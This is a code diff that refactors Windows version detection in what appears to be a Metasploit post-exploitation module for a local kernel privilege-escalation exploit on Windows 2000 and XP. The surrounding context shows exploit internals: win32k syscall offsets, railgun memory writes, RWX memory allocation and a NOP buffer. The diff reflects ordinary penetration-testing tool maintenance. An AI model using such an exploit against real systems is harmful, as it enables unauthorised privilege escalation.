@@ -6,6 +6,7 @@
 require 'metasm'
 
 class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Version
 
   def initialize(info = {})
     super(
@@ -44,7 +45,6 @@ class MetasploitModule < Msf::Post
               stdapi_railgun_api
               stdapi_railgun_memwrite
               stdapi_sys_config_getenv
-              stdapi_sys_config_sysinfo
               stdapi_sys_process_getpid
             ]
           }
@@ -57,23 +57,19 @@ class MetasploitModule < Msf::Post
     mem_base = nil
     dllpath = nil
     hDll = false
-
-    vuln = false
-    winver = session.sys.config.sysinfo['OS']
-    affected = [ 'Windows 2000', 'Windows XP' ]
-    affected.each do |v|
-      if winver.include? v
-        vuln = true
-        break
-      end
+    version = get_version_info
+    unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::Win7_SP0)
+      print_error("#{version.product_name} is not vulnerable.")
+      return
     end
-    if !vuln
-      print_error("#{winver} is not vulnerable.")
+
+    unless version.build_number.between?(Msf::WindowsVersion::Win2000, Msf::WindowsVersion::XP_SP2)
+      print_error("#{version.product_name} is vulnerable, but not supported by this module.")
       return
     end
 
     # syscalls from http://j00ru.vexillium.org/win32k_syscalls/
-    if winver =~ /2000/
+    if version.build_number == Msf::WindowsVersion::Win2000
       system_pid = 8
       pid_off = 0x9c
       flink_off = 0xa0
@@ -216,7 +212,7 @@ class MetasploitModule < Msf::Post
       print_error('Unable to allocate RWX memory @ 0x%x' % mem_base)
       return
     end
-    print_status('Allocated 0x%x bytes of memory @ 0x%x' % [mem_size, mem_base])
+    print_status(format('Allocated 0x%x bytes of memory @ 0x%x', mem_size, mem_base))
 
     # Initialize the buffer to contain NO-OPs
     nops = "\x90" * mem_size
